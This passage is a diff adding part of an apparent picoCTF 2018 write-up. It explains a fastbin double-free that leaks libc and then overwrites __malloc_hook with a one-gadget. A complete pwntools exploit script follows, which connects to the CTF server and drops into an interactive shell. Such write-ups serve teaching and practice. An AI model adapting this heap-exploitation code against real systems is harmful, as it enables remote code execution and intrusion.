@@ -135,4 +135,130 @@ make cake (price = 0x6030e0) -> make cake -> make cake -> make cake (price = 0x6
 ```
 (here `p64` is a function that packs the address into a string). Finally calling inspect on cake 1 outputs stdout's GOT entry as the price.
 
-##### Overwriting __malloc_hook
+##### Overwriting \_\_malloc\_hook
+Perfect! We've leaked libc! Now it's time to use this to overwrite something important, for which we choose to overwrite \_\_malloc\_hook just like in contacts. How can we do this? Well, we can't do it like we did in contacts. In contacts, we used the fact that there is a `0x7f` byte that we can isolate as a fake chunk header very close to \_\_malloc\_hook. However, there is two problems with that here. Firstly, creating a cake requests only 16 bytes to which `0x7f` is too large of a size specifier. Secondly, creating a cake only let's us write 16 bytes, and using this `0x7f` as our fake header is too far away from \_\_malloc\_hook to let us overwrite it. How do we get around this? Well the trick is to notice that when creating a cake, the name attribute is stored at offset `+0x8` from the start of the cake, but it is written first (followed by writing price). Thus imagine we trick malloc to return the shop address while writing data for cake 1. Writing the name for cake 1 would overwrite cake 1's own pointer, to which we could replace with an abritrary address, and then when we input our price for cake 1 it will be written at the victim address we overwrote cake 1's pointer to. The goal is now reduced to setting up the scenario in which we are writing data for cake 1 at the location of shop.
+
+The first problem we have to solve is the fact that we already allocated cake 1 in order to leak libc, so without some extra work, creating new cakes will never try to create cake 1 again. To solve this we can do another double free to trick malloc into returning the shop address, and then overwrite cake 1's pointer will null so that we can create it again. This looks like the following sequence of actions
+```
+serve cake 4 -> serve cake 3 -> serve cake 4 -> create cake (price = 0x6030e0) -> create cake -> create cake
+```
+At this pointer we know that, by having performed this double free, the top of the fastbin list has the address `0x6030e0`. However, we've done even better. Remember how when leaking libc we decided to overwrite cake 0's pointer with `0x6030e0`? Well when we malloc another cake and it returns `0x6030e0` as our address, it will read cake 0's pointer as the FD pointer and place `0x6030e0` on the fastbin list again. So really, after this double free our fastbin list looks like `0x6030e0 -> 0x6030e0`. Perfect! The first thing we do is create a new cake and use the name field to set cake 1's pointer to null.
+```
+create cake (name = p64(0))
+```
+Now when we create another cake, we will be writting the data for cake 1, and we will be writing it at a fake chunk located at the shop pointer. Since name gets written first we can overwrite cake 1's pointer with the address of \_\_malloc\_hook, and then by setting the price of cake 1 we can overwrite \_\_malloc\_hook with a one gadget.
+```
+create cake (name = p64(__malloc_hook), price = one_gadget)
+```
+Then the next time we malloc something, the \_\_malloc\_hook function will be called and we win. First we serve a cake to fix the fastbin list, then create a new cake and we're in!
+
+###### Full Exploit
+The full exploit is below.
+```python
+from pwn import *
+
+def reset():
+	r.recvuntil("> ", timeout=2)
+	r.recvuntil("> ", timeout=2)
+
+def free(idx):
+	reset()
+	r.sendline("S")
+	r.recvuntil("> ")
+	r.sendline(str(idx))
+
+def allocate(name="", price="0"):
+	reset()
+	r.sendline("M")
+	r.recvuntil("Name> ")
+	r.sendline(name)
+	r.recvuntil("Price> ")
+	r.sendline(price)
+
+def read(idx):
+	reset()
+	r.sendline("I")
+	r.recvuntil("> ")
+	r.sendline(str(idx))
+	feedback = r.recvuntil("> ")
+	return feedback.split("\n")[0].split("$")[-1]
+
+
+def exploit():
+	libc = ELF("./libc.so.6")
+	
+	#################### leak libc base #######################
+	allocate()
+	log.info("Applying fastbin attack...")
+	allocate()
+	allocate()
+
+	free(1)
+	free(2)
+	free(1)
+	log.success("Double free performed.")
+	
+	log.info("Overwriting FD pointer...")
+	# Set FD pointer to customers location
+	allocate(price=str(0x6030e0))	
+	allocate()
+	allocate()
+	
+	binsize = 0x20
+	log.info("Waiting for " + str(binsize) + " customers...")
+	r.recvuntil("> ")
+	while True:
+		r.sendline("I")
+		r.recvuntil("> ")
+		r.sendline("0")
+		feedback = r.recvuntil("> ")
+		if "have " + str(binsize) + " customers" in feedback:
+			break
+	
+	log.info("Overwriting first cake's address...")
+	# Set to address of GOT entry
+	allocate(name=p64(0x6030c0), price=str(0x6030e0))
+	address = int(read(1))
+	libc_base = address - 0x3a5d70
+	log.success("libc base found at: " + hex(libc_base))
+	
+	######################### Exploit #########################
+	
+	log.info("Performing fastbin attack...")
+	free(4)
+	free(3)
+	free(4)
+	
+	log.success("Double free performed.")
+	allocate(price=str(0x6030e0))
+	allocate()
+	allocate()
+	
+	log.info("Waiting for " + str(binsize) + " customers...")
+	r.recvuntil("> ")
+	while True:
+		r.sendline("I")
+		r.recvuntil("> ")
+		r.sendline("0")
+		feedback = r.recvuntil("> ")
+		if "have " + str(binsize) + " customers" in feedback:
+			break
+	log.info("Prepping attack...")
+	allocate(name=p64(0), price=str(0x6030e0))
+	
+	log.info("Performing attack...")
+	victim = libc_base + 0x3a5260 - 0x8
+	one_shot = libc_base + 0xf1147 + (0x3a5260 - libc.symbols["__malloc_hook"])
+	allocate(name=p64(victim), price=str(one_shot))
+
+	free(5)
+	allocate()
+
+	r.interactive()
+
+
+if __name__ == "__main__":
+	r = remote("2018shell2.picoctf.com", 36275)
+	exploit()
+```
+The one point of interest is that pwntools ELF class got the wrong offset for \_\_malloc\_hook, and the error term happened to also be the same as the error in offset for the one gadget's given by david942j's [one gadget tool](https://github.com/david942j/one_gadget), which explains adding the term `(0x3a5260 - libc.symbols["__malloc_hook"])` to the one gadget address.
